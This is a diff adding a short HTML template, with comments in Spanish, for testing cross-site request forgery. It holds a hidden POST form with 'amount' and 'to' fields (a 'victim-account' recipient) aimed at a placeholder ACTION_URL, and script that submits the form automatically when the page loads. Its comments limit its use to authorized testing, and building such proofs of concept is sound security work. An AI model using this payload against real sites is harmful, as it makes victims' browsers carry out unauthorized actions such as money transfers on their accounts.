@@ -1,0 +1,27 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>CSRF Test (plantilla)</title>
+  </head>
+  <body>
+    <!--
+      INSTRUCCIONES:
+      - Reemplaza ACTION_URL por la URL objetivo que quieres probar (POST).
+      - Este formulario se auto-envía al cargar la página para simular un CSRF.
+      - NO uses en producción ni contra servicios sin autorización.
+    -->
+    <form id="f" action="ACTION_URL" method="POST">
+      <!-- Ejemplo de parámetros: ajusta según la petición real -->
+      <input type="hidden" name="amount" value="1" />
+      <input type="hidden" name="to" value="victim-account" />
+    </form>
+    <script>
+      // Auto-submit para simular CSRF
+      window.addEventListener('load', function(){
+        try{ document.getElementById('f').submit(); } catch(e){}
+      });
+    </script>
+    <p>Editar <code>ACTION_URL</code> y cargar este archivo desde un origen distinto al objetivo para probar CSRF.</p>
+  </body>
+</html>
